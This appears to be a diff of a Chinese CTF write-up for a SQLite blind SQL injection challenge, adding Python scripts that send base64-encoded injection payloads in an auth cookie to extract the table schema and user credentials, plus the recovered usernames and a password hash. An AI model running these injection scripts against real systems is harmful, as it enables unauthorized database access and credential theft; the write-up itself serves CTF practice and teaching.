@@ -4,6 +4,8 @@
 
 ## 考点
 
+* sqlite3盲注
+
 ## wp
 
 登录页面，随便输提示`Username must be alphanumeric.`
@@ -70,25 +72,66 @@ for i in range(1, 50):
 
 得到表userinfo，reviews，notes
 
-由于sqlite3在进行字符比较时不区分大小写，所以在注入字段时不能用二分法
+由于sqlite3在进行字符比较时不区分大小写，所以在注入字段时不能用二分法，同时可能会有不可见字符，所以对结果进行hex编码然后再布尔盲注判断字符
 
 ```python
 #coding=utf-8 
 import requests
 import base64
 import time
-url = 'http://2bb85f0d-3f92-4755-b53f-d02260975746.node4.buuoj.cn:81/sequels'
+url = 'http://58104486-6db8-40ed-9632-8897a13ff8ae.node4.buuoj.cn:81/sequels'
 s = requests.session()
 flag = ''
-
-for i in range(25, 5000):
+table = '0123456789ABCDEF'
+for i in range(1, 5000):
     print(flag)
         
-    for j in range(32,127):
-        st = chr(j)
-        if st == '"':
-            st = '\\"'
-        payload = '{"username":"\\" or 1=((substr((select sql from sqlite_master where type=\\"table\\" and name=\\"userinfo\\" limit 1 offset 0),'+str(i)+',1))=\\"'+st+'\\")--","password":"guest"}'
+    for j in table:
+        
+        payload = '{"username":"\\" or 1=(substr((select hex(sql) from sqlite_master where type=\\"table\\" and name=\\"userinfo\\" limit 1 offset 0),'+str(i)+',1)=\\"'+j+'\\")--","password":"guest"}'
+
+        cookies = {
+            '1337_AUTH': base64.b64encode(payload.encode()).decode(),
+        }
+        print(payload)
+        r = s.get(url=url, cookies=cookies)
+        time.sleep(0.3)
+        print(r.text)
+        # true
+        if len(r.text) > 3400:
+            flag = flag + j
+            break
+        # false
+        if 'Invalid user' in  r.text:
+            continue
+ 
+```
+
+结果
+
+```sql
+CREATE TABLE userinfo (
+                        username text not null primary key,
+                        password text not null)
+```
+
+然后注入，得到用户名密码
+
+```python
+#coding=utf-8 
+import requests
+import base64
+import time
+url = 'http://58104486-6db8-40ed-9632-8897a13ff8ae.node4.buuoj.cn:81/sequels'
+s = requests.session()
+flag = ''
+table = '0123456789ABCDEF'
+for i in range(1, 5000):
+    print(flag)
+        
+    for j in table:
+        
+        payload = '{"username":"\\" or 1=(substr((select hex(group_concat(username)) from userinfo),'+str(i)+',1)=\\"'+j+'\\")--","password":"guest"}'
 
         cookies = {
             '1337_AUTH': base64.b64encode(payload.encode()).decode(),
@@ -98,19 +141,23 @@ for i in range(25, 5000):
         time.sleep(0.3)
         #print(r.text)
         # true
-        if len(r.text) > 3400:
-            flag = flag + chr(j)
+        if 'No note for' in r.text:
+            flag = flag + j
             break
         # false
-        elif 'Invalid user' in  r.text:
-            continue
-        else:
-            flag = flag + '#'
+        if 'Invalid user' in  r.text:
             continue
  
 ```
 
+结果如下
 
+```
+guest,sequeladmin
+guest,f5ec3af19f0d3679e7d5a148f4ac323d
+```
+
+![](<../.gitbook/assets/image (22).png>)
 
 ## 小结
 
@@ -118,4 +165,4 @@ sqlite3注入
 
 1. 找表`select name from sqlite_master where type="table"`，需要限制输出的话是`select name from sqlite_master where type="table" limit 1 offset 0`，修改offset，从0开始，如果超过表的数量会返回错误
 2. 找字段`select sql from sqlite_master where type="table" and name="userinfo"`
-3.
+3. 盲注考虑编码再注入，避免很多不必要的麻烦
